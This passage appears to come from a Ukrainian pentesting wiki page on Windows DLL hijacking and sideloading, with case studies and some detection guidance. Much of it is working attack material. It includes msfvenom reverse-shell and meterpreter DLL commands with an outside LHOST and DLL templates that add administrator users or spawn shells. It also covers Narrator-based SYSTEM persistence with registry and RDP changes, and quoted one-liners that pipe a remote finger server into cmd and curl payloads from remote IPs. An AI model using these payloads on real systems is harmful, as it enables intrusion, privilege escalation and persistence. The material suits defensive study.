[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)перевірить, чи маєте ви права на запис до будь-якої папки в системному PATH.\
Інші корисні автоматизовані інструменти для виявлення цієї вразливості — це **функції PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ та _Write-HijackDll._

### Приклад

Якщо ви знайдете сценарій, який можна експлуатувати, для успішної експлуатації найважливіше — **створити dll, що експортує принаймні всі функції, які виконуваний файл імпортуватиме з неї**. У будь-якому разі зауважте, що DLL Hijacking зручно використовувати для [підвищення рівня цілісності з Medium до High **(обходячи UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) або з[ **High Integrity до SYSTEM**](../index.html#from-high-integrity-to-system)**.** Приклад того, **як створити коректну dll**, можна знайти в цьому дослідженні DLL Hijacking, присвяченому DLL Hijacking для виконання: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Крім того, у **наступному розділі** ви знайдете кілька **базових кодів dll**, які можуть стати в пригоді як **шаблони** або для створення **dll з експортованими функціями, які не є обов’язковими**.

## **Створення та компіляція DLL**

### **DLL Proxifying**

Загалом, **DLL proxy** — це DLL, здатна **виконати ваш шкідливий код під час завантаження**, а також **надавати** і **працювати** так, як **очікується**, **переспрямовуючи всі виклики до справжньої бібліотеки**.

За допомогою інструмента [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) або [**Spartacus**](https://github.com/Accenture/Spartacus) можна **вказати виконуваний файл і вибрати бібліотеку**, яку потрібно проксіювати, та **згенерувати проксійовану dll**, або **вказати DLL** і **згенерувати проксійовану dll**.

### **Meterpreter**

**Отримання rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Отримати meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Створіть користувача (x86, версії x64 я не бачив):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Власна

У багатьох випадках DLL, яку ви компілюєте, має **експортувати кожну функцію, імпортовану процесом-жертвою**. Якщо потрібного експорту немає, бінарний файл не зможе його знайти, і експлойт не спрацює.

<details>
<summary>Шаблон DLL на C (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Приклад DLL на C++ зі створенням користувача</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Альтернативна C DLL із точкою входу потоку</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

### DLL NativeAOT з ініціалізацією, що запускається експортованими функціями

Автономну **спільну бібліотеку .NET NativeAOT** можна використати як підкладену нативну DLL без реалізації явного `DllMain`. Експортуйте статичні методи C# за допомогою `[UnmanagedCallersOnly(EntryPoint = "...")]`; коли нативний host викликає одну з цих згенерованих компілятором точок входу, NativeAOT ініціалізує модуль, а метод `[ModuleInitializer]` виконується до тіла експортованого методу C#. Для роботи цього вихідного файла не потрібне окремо встановлене середовище виконання .NET.<sup>[[26]](#references)[[27]](#references)[[28]](#references)[[29]](#references)</sup>

DLL усе одно має містити **назви експортів і сигнатури, сумісні з ABI**, які викликає вибраний host. Мінімальних заглушок може бути достатньо для запуску ініціалізації, але відсутні експорти можуть перешкодити завантаженню, а неправильна сигнатура може пошкодити виклик. Перелічіть імпортовані host функції та перевірте результат командою `dumpbin /exports payload.dll`, перш ніж перейменовувати вихідний файл на ім’я залежності, яке очікує host.<sup>[[26]](#references)[[28]](#references)</sup>

<details>
<summary>Мінімальна експортована DLL NativeAOT</summary>

```csharp
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal static class Bootstrap
{
    [ModuleInitializer]
    internal static void Start()
    {
        File.WriteAllText(Path.Combine(Path.GetTempPath(), "nativeaot-sideload.txt"),
                          Environment.ProcessPath ?? "loaded");
    }
}

public static class Exports
{
    [UnmanagedCallersOnly(EntryPoint = "LoadLibraryShim")]
    public static nint LoadLibraryShim() => 0;
}
```

</details>

Налаштуйте проєкт як самодостатню нативну спільну бібліотеку Windows:<sup>[[26]](#references)[[27]](#references)</sup>

```xml
<PropertyGroup>
  <TargetFramework>net7.0</TargetFramework>
  <PublishAot>true</PublishAot>
  <NativeLib>Shared</NativeLib>
  <SelfContained>true</SelfContained>
  <RuntimeIdentifier>win-x64</RuntimeIdentifier>
</PropertyGroup>
```

```powershell
dotnet publish .\SideloadPoc.csproj -c Release -r win-x64
dumpbin /exports .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll
Copy-Item .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll .\<expected-name>.dll
```

Розмістіть перейменовану DLL поруч зі скопійованим вразливим виконуваним файлом і запустіть host через шлях виконання коду, який викликає сумісний експорт. Такий підхід з ініціалізатором дає змогу не розміщувати складну логіку безпосередньо в `DllMain`, але передумови для sideload залишаються незмінними: loader має розв’язати залежність за назвою, вибрати каталог програми й не знайти її раніше через KnownDLLs, уже завантажений модуль, перенаправлення SxS або обмежені прапорці `LOAD_LIBRARY_SEARCH_*`.<sup>[[26]](#references)[[30]](#references)</sup>

Приклади звичайних native-шаблонів див. у розділі [Windows C payloads](../windows-c-payloads.md). Перший етап, завантажений через sideload, може згодом виконати [process hollowing](../../../reversing/common-api-used-in-malware.md#process-hollowing-aka-runpe), але це окрема техніка ін’єкції, а не частина розв’язання DLL.

## Виявлення: завантаження бібліотек DLL masquerading

Elastic Defend 9.5.0 доповнює подію завантаження бібліотеки полем `dll.Ext.defense_evasions: "DLL Hijack: Masquerading"`, коли завантажений файл не має підпису Microsoft, а його назва збігається з назвою DLL Windows/системної DLL у кешованому переліку Elastic. Це переносить аналіз переліку назв файлів, системного розташування та підпису в endpoint-сенсор; тому основний EQL можна скоротити до:<sup>[[26]](#references)</sup>

```text
library where host.os.type == "windows" and event.action == "load" and
  dll.Ext.defense_evasions : "DLL Hijack: Masquerading"
```

Розглядайте збагачення даних як цінну підказку для подальшого аналізу, а не як самостійний доказ. Підвищуйте рівень упевненості, якщо підписаний хост завантажує DLL зі свого **каталогу, доступного для запису користувачем**, DLL не підписана або не є довіреною, а `dll.Ext.relative_file_creation_time` показує, що її було створено незадовго до завантаження. Обмежуйте виключення точним видавцем, процесом хоста та шляхом інсталяції; не ігноруйте глобально конфліктну назву DLL, оскільки легітимні інсталятори й програми можуть постачати приватні бібліотеки з назвами, схожими на системні.<sup>[[26]](#references)</sup>

На сенсорах без такого збагачення даних наближено виявляйте цю поведінку, зіставляючи конфліктну назву DLL із шляхом завантаження поза системними каталогами, відсутнім або недовіреним підписом Microsoft і коротким інтервалом між створенням файлу та його завантаженням. Для цього потрібен актуальний перелік назв DLL і вузькі виключення для `%SystemRoot%\\System32`, `SysWOW64`, `WinSxS` та інших схвалених шляхів розгортання.<sup>[[26]](#references)</sup>

## Case Study: Hijack DLL локалізації Narrator OneCore TTS (спеціальні можливості/ATs)

Windows Narrator.exe досі під час запуску перевіряє передбачувану DLL локалізації для певної мови, яку можна перехопити для довільного виконання коду та закріплення в системі.<sup>[[7]](#references)</sup>

Ключові факти
- Шлях перевірки (поточні збірки): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Застарілий шлях (старіші збірки): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Якщо за шляхом OneCore є доступна для запису DLL, контрольована зловмисником, її буде завантажено, а `DllMain(DLL_PROCESS_ATTACH)` виконається. Експорти не потрібні.

Виявлення за допомогою Procmon
- Фільтр: `Process Name is Narrator.exe` і `Operation is Load Image` або `CreateFile`.
- Запустіть Narrator і спостерігайте за спробою завантажити DLL за вказаним вище шляхом.

Мінімальна DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC безшумність
- Наївний hijack озвучить текст або підсвітить UI. Щоб діяти тихо, під час attach перелічи потоки Narrator, відкрий основний потік (`OpenThread(THREAD_SUSPEND_RESUME)`) і призупини його через `SuspendThread`; продовжуй у власному потоці. Повний код див. у PoC.<sup>[[8]](#references)</sup>

Запуск і persistence через конфігурацію Accessibility
- Контекст користувача (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Після цього запуск Narrator завантажить підкладену DLL. На захищеному робочому столі (екрані входу) натисни CTRL+WIN+ENTER, щоб запустити Narrator; твоя DLL виконається від імені SYSTEM на захищеному робочому столі.

Запуск виконання від імені SYSTEM через RDP (латеральне переміщення)
- Дозволь класичний рівень безпеки RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Підключись до хоста через RDP, на екрані входу натисни CTRL+WIN+ENTER, щоб запустити Narrator; твоя DLL виконається від імені SYSTEM на захищеному робочому столі.
- Виконання припиниться після закриття сеансу RDP — оперативно виконай inject/migrate.

Bring Your Own Accessibility (BYOA)
- Можна клонувати запис реєстру вбудованого Accessibility Tool (AT), наприклад CursorIndicator, змінити його так, щоб він вказував на довільний бінарний файл/DLL, імпортувати його, а потім задати `configuration` як назву цього AT. Так можна проксувати довільне виконання через фреймворк Accessibility.

Примітки
- Для запису в `%windir%\System32` і зміни значень HKLM потрібні права адміністратора.
- Уся логіка payload може міститися в `DLL_PROCESS_ATTACH`; експорти не потрібні.

## Розбір випадку: CVE-2025-1729 — підвищення привілеїв за допомогою TPQMAssistant.exe

У цьому прикладі показано **Phantom DLL Hijacking** у TrackPoint Quick Menu від Lenovo (`TPQMAssistant.exe`), зареєстрований як **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Деталі вразливості

- **Компонент**: `TPQMAssistant.exe`, розташований у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Заплановане завдання**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` запускається щодня о 9:30 від імені користувача, який увійшов у систему.
- **Дозволи на каталог**: каталог доступний для запису власнику `CREATOR OWNER`, що дозволяє локальним користувачам розміщувати довільні файли.
- **Поведінка пошуку DLL**: спершу програма намагається завантажити `hostfxr.dll` із робочого каталогу й записує в журнал "NAME NOT FOUND", якщо файл відсутній, що вказує на пріоритет пошуку в локальному каталозі.

### Реалізація експлойту

Зловмисник може розмістити шкідливу заглушку `hostfxr.dll` у тому самому каталозі й скористатися відсутністю DLL, щоб виконати код у контексті користувача:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Потік атаки

1. Як звичайний користувач, помістіть `hostfxr.dll` у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Дочекайтеся запуску запланованого завдання о 9:30 під обліковим записом поточного користувача.
3. Якщо під час виконання завдання в системі увійшов адміністратор, шкідлива DLL запуститься в його сеансі з рівнем цілісності medium.
4. Поєднайте це зі стандартними техніками обходу UAC, щоб підвищити рівень привілеїв від medium до SYSTEM.

## Приклад: дропер на основі MSI CustomAction + DLL side-loading через підписаний хост (wsc_proxy.exe)

Зловмисники часто поєднують дропери на основі MSI з DLL side-loading, щоб виконувати корисне навантаження в довіреному підписаному процесі.<sup>[[10]](#references)</sup>

Огляд ланцюжка
- Користувач завантажує MSI. Під час встановлення через GUI CustomAction непомітно запускається (наприклад, LaunchApplication або дія VBScript) і відновлює наступний етап з вбудованих ресурсів.
- Дропер записує легітимний підписаний EXE і шкідливу DLL в один каталог (приклад пари: підписаний Avast файл wsc_proxy.exe і контрольований зловмисником файл wsc.dll).
- Після запуску підписаного EXE порядок пошуку DLL у Windows спершу завантажує wsc.dll із робочого каталогу, виконуючи код зловмисника в підписаному батьківському процесі (ATT&CK T1574.001).

Аналіз MSI (на що звернути увагу)
- Таблиця CustomAction:
  - Шукайте записи, які запускають виконувані файли або VBScript. Приклад підозрілого шаблону: LaunchApplication запускає вбудований файл у фоновому режимі.
  - В Orca (Microsoft Orca.exe) перевірте таблиці CustomAction, InstallExecuteSequence і Binary.
- Вбудовані або розділені корисні навантаження в CAB-файлі MSI:
  - Адміністративне розпакування: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Або скористайтеся lessmsi: lessmsi x package.msi C:\out
  - Шукайте кілька невеликих фрагментів, які об’єднуються та розшифровуються CustomAction на VBScript. Типовий ланцюжок:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Практичне sideloading із wsc_proxy.exe
- Розмістіть ці два файли в одній папці:
  - wsc_proxy.exe: легітимний підписаний хост (Avast). Процес намагається завантажити wsc.dll за іменем із його каталогу.
  - wsc.dll: DLL зловмисника. Якщо спеціальні exports не потрібні, достатньо DllMain; інакше створіть proxy DLL і перенаправте необхідні exports до справжньої бібліотеки, запустивши payload у DllMain.
- Створіть мінімальний payload DLL:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Для вимог до експорту використовуйте фреймворк проксіювання (наприклад, DLLirant/Spartacus), щоб створити DLL-переадресувач, який також виконує ваш payload.

- Ця техніка залежить від визначення імен DLL хост-бінарним файлом. Якщо хост використовує абсолютні шляхи або безпечні прапорці завантаження (наприклад, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack може не спрацювати.
- KnownDLLs, SxS і переадресовані експорти можуть впливати на пріоритетність і їх потрібно враховувати під час вибору хост-бінарного файла та набору експортів.

## Підписані трійки + зашифровані payload-и (розбір випадку ShadowPad)

Check Point описала, як Ink Dragon розгортає ShadowPad за допомогою **трійки з трьох файлів**, щоб маскуватися під легітимне програмне забезпечення, зберігаючи основний payload зашифрованим на диску:<sup>[[12]](#references)</sup>

1. **Підписаний хостовий EXE** – зловживають програмами таких виробників, як AMD, Realtek або NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Зловмисники перейменовують виконуваний файл так, щоб він нагадував бінарний файл Windows (наприклад, `conhost.exe`), але підпис Authenticode залишається дійсним.
2. **Шкідлива DLL-завантажувач** – розміщується поруч із EXE під очікуваним іменем (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Зазвичай це MFC-бінарний файл, обфускований за допомогою фреймворку ScatterBrain; його єдине завдання — знайти зашифрований blob, розшифрувати його та відобразити ShadowPad у пам’яті через reflective mapping.
3. **Зашифрований blob payload-а** – часто зберігається як `<name>.tmp` у тому самому каталозі. Після відображення розшифрованого payload-а в пам’яті завантажувач видаляє TMP-файл, щоб знищити криміналістичні докази.

Нотатки щодо tradecraft:

* Перейменування підписаного EXE зі збереженням початкового `OriginalFileName` у PE-заголовку дає змогу маскувати його під бінарний файл Windows, зберігаючи підпис виробника. Тож наслідуйте звичку Ink Dragon розміщувати бінарні файли, схожі на `conhost.exe`, які насправді є утилітами AMD/NVIDIA.
* Оскільки виконуваний файл залишається довіреним, більшості засобів контролю списків дозволених програм достатньо, щоб ваша шкідлива DLL лежала поруч із ним. Зосередьтеся на налаштуванні DLL-завантажувача; підписаний батьківський процес зазвичай можна запускати без змін.
* Дешифратор ShadowPad очікує, що TMP-blob лежатиме поруч із завантажувачем і буде доступним для запису, щоб після відображення в пам’яті він міг обнулити файл. Залиште каталог доступним для запису до завантаження payload-а; після його завантаження в пам’ять TMP-файл можна безпечно видалити для OPSEC.

### Ланцюжок sideloading із LOLBAS-stager і staged-архівом (finger → tar/curl → WMI)

Оператори поєднують DLL sideloading із LOLBAS, щоб єдиним власним артефактом на диску була шкідлива DLL поруч із довіреним EXE:<sup>[[1]](#references)</sup>

- **Завантажувач віддалених команд (Finger):** прихований PowerShell запускає `cmd.exe /c`, отримує команди із сервера Finger і передає їх у `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` отримує текст через TCP/79; `| cmd` виконує відповідь сервера, даючи операторам змогу змінювати другий етап на сервері.

- **Вбудоване завантаження/розпакування:** Завантажте архів із нешкідливим розширенням, розпакуйте його та розмістіть цільовий файл для sideloading разом із DLL у випадковій теці `%LocalAppData%`:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` приховує індикатор виконання та переходить за перенаправленнями; `tar -xf` використовує вбудований у Windows tar.

- **Запуск через WMI/CIM:** Запустіть EXE через WMI, щоб у телеметрії процес, створений через CIM, завантажував DLL, що знаходиться поруч:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Працює з бінарними файлами, які віддають перевагу локальним DLL (наприклад, `intelbq.exe`, `nearby_share.exe`); payload (наприклад, Remcos) запускається під довіреною назвою.

- **Пошук:** створюйте сповіщення про `forfiles`, коли параметри `/p`, `/m` і `/c` з’являються разом; поза адміністративними скриптами це трапляється нечасто.


## Розбір випадку: sideload NSIS dropper + Bitdefender Submission Wizard (Chrysalis)

Під час нещодавнього вторгнення Lotus Blossom зловмисники використали довірений ланцюжок оновлення, щоб доставити запакований NSIS dropper, який розгортав DLL sideload і payloads, що повністю виконувалися в пам’яті.<sup>[[13]](#references)</sup>

Послідовність tradecraft
- `update.exe` (NSIS) створює `%AppData%\Bluetooth`, позначає каталог як **HIDDEN**, скидає перейменований Bitdefender Submission Wizard `BluetoothService.exe`, шкідливий `log.dll` і зашифрований blob `BluetoothService`, а потім запускає EXE.
- Хостовий EXE імпортує `log.dll` і викликає `LogInit`/`LogWrite`. `LogInit` завантажує blob через mmap; `LogWrite` розшифровує його за допомогою потокового шифру на основі LCG (константи **0x19660D** / **0x3C6EF35F**, матеріал ключа отримано з попереднього хешу), перезаписує буфер відкритим shellcode, звільняє тимчасові дані та передає йому керування.
- Щоб уникнути IAT, loader розв’язує API, хешуючи назви експортів за допомогою **основи FNV-1a 0x811C9DC5 + простого числа 0x1000193**, а потім застосовує Murmur-подібну avalanche-функцію (**0x85EBCA6B**) і порівнює результат із цільовими хешами з сіллю.

Основний shellcode (Chrysalis)
- Розшифровує головний модуль, схожий на PE, повторюючи додавання/XOR/віднімання з ключем `gQ2JR&9;` упродовж п’яти проходів, а потім динамічно завантажує `Kernel32.dll` → `GetProcAddress`, щоб завершити розв’язання імпортів.
- Відновлює рядки з назвами DLL під час виконання за допомогою побайтових перетворень rotate/XOR, а потім завантажує `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Використовує другий resolver, який проходить ланцюжок **PEB → InMemoryOrderModuleList**, розбирає кожну таблицю експортів блоками по 4 байти із Murmur-подібним змішуванням і викликає `GetProcAddress` лише як запасний варіант, якщо хеш не знайдено.

Вбудована конфігурація та C2
- Конфігурація міститься у скинутому файлі `BluetoothService` за **зміщенням 0x30808** (розмір **0x980**) і розшифровується RC4 з ключем `qwhvb^435h&*7`, що відкриває URL C2 і User-Agent.
- Beacons формують профіль хоста з компонентів, розділених крапками, додають спереду тег `4Q`, а потім шифрують його RC4 з ключем `vAuig34%^325hGV` перед викликом `HttpSendRequestA` через HTTPS. Відповіді розшифровуються RC4 і обробляються перемикачем тегів (`4T` shell, `4V` виконання процесу, `4W/4X` запис файлу, `4Y` читання/exfil, `4\\` видалення, `4` перелічення дисків/файлів + випадки передавання частинами).
- Режим виконання визначається аргументами командного рядка: без аргументів — встановлюється persistence (служба/ключ Run) із посиланням на `-i`; `-i` повторно запускає себе з `-k`; `-k` пропускає встановлення й запускає payload.

Виявлений альтернативний loader
- Під час того самого вторгнення було скинуто Tiny C Compiler і виконано `svchost.exe -nostdlib -run conf.c` з `C:\ProgramData\USOShared\`, а поруч розміщено `libtcc.dll`. Наданий зловмисником вихідний код C містив shellcode, який компілювався і виконувався в пам’яті без запису PE на диск. Відтворіть це за допомогою:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- На цьому етапі компіляції та запуску на основі TCC імпортувався `Wininet.dll` під час виконання, а з жорстко заданої URL-адреси завантажувався shellcode другого етапу. У результаті отримували гнучкий loader, що маскувався під запуск компілятора.

## Sideloading підписаного хоста з проксіюванням export-функцій і паркуванням потоку хоста

Деякі ланцюжки DLL sideloading додають **заходи для підвищення стабільності**, щоб легітимний хост залишався запущеним достатньо довго для коректного завантаження наступних етапів, а не аварійно завершувався після завантаження шкідливої DLL.<sup>[[11]](#references)</sup>

Спостережуваний шаблон
- Розмістити довірений EXE поруч зі шкідливою DLL, використовуючи очікуване ім’я залежності, наприклад `version.dll`.
- Шкідлива DLL **проксіює кожну очікувану export-функцію** до справжньої системної DLL (наприклад, `%SystemRoot%\\System32\\version.dll`), щоб імпорт і надалі коректно розв’язувався, а процес хоста продовжував працювати.
- Після завантаження шкідлива DLL **патчить точку входу хоста**, щоб головний потік потрапляв у нескінченний цикл `Sleep` замість завершення або виконання шляхів коду, які призвели б до зупинки процесу.
- Новий потік виконує справжню шкідливу роботу: розшифровує ім’я або шлях DLL наступного етапу (часто використовуються RC4/XOR), а потім запускає її за допомогою `LoadLibrary`.

Чому це важливо
- Звичайне проксіювання DLL зберігає сумісність API, але не гарантує, що хост працюватиме достатньо довго для наступних етапів.
- Призупинення головного потоку в `Sleep(INFINITE)` — простий спосіб залишити підписаний процес запущеним, поки loader виконує розшифрування, підготовку наступного етапу або початкове мережеве підключення в робочому потоці.
- Пошук лише підозрілої `DllMain` не виявить цей шаблон, якщо цікава поведінка починається після патчу точки входу хоста та запуску другого потоку.

Мінімальний робочий процес
1. Скопіювати підписаний EXE хоста та визначити DLL, яку він завантажує з локального каталогу.
2. Створити proxy DLL, що експортує ті самі функції та перенаправляє виклики до легітимної DLL.
3. У `DllMain(DLL_PROCESS_ATTACH)` створити робочий потік.
4. У цьому потоці пропатчити точку входу хоста або процедуру запуску головного потоку так, щоб вона виконувала цикл із `Sleep`.
5. Розшифрувати ім’я/конфігурацію DLL наступного етапу й викликати `LoadLibrary` або виконати manual-map payload.

Орієнтири для захисту
- Підписані процеси, що завантажують `version.dll` або подібні поширені бібліотеки з власного каталогу програми, а не з `System32`.
- Патчі пам’яті в точці входу процесу невдовзі після завантаження образу, особливо переходи/виклики, перенаправлені до `Sleep`/`SleepEx`.
- Потоки, створені proxy DLL, які відразу викликають `LoadLibrary` для другої DLL із розшифрованим ім’ям.
- Proxy DLL з повним набором export-функцій, розміщені поруч із виконуваними файлами виробника в доступних для запису каталогах підготовки, таких як `ProgramData`, `%TEMP%` або каталоги розпакованих архівів.

## References

- [1] [Red Canary – Аналітичні огляди розвідки: січень 2026 року](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 — підвищення привілеїв за допомогою TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store — TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna — TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc — DLL hijacking у Windows. Простий приклад на C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research — Nimbus Manticore розгортає нове malware, націлене на Європу](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec — Hack-cessibility: коли DLL hijack зустрічається з помічниками Windows](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC — api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 — Цифрові двійники: анатомія мінливих кампаній із видаванням себе за інших, що поширюють Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 — Збіг інтересів: аналіз кластерів загроз, націлених на уряд Південно-Східної Азії](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research — Усередині Ink Dragon: розкриття ретрансляційної мережі та внутрішньої будови прихованої наступальної операції](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 — Бекдор Chrysalis: детальний аналіз інструментарію Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf — HTB Bruno: ланцюжок ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 — Відстеження шпигунських кампаній Screening Serpens, іранської APT, у 2026 році](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn — елемент `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn — елемент `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn — елемент `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn — елемент `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn — елемент `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn — елемент `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research — Швидкі та запеклі: операції Nimbus Manticore під час іранського конфлікту](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn — дії завдань](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK — T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 — CL-STA-1062 націлюється на уряди та критичну інфраструктуру країн Південно-Східної Азії](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
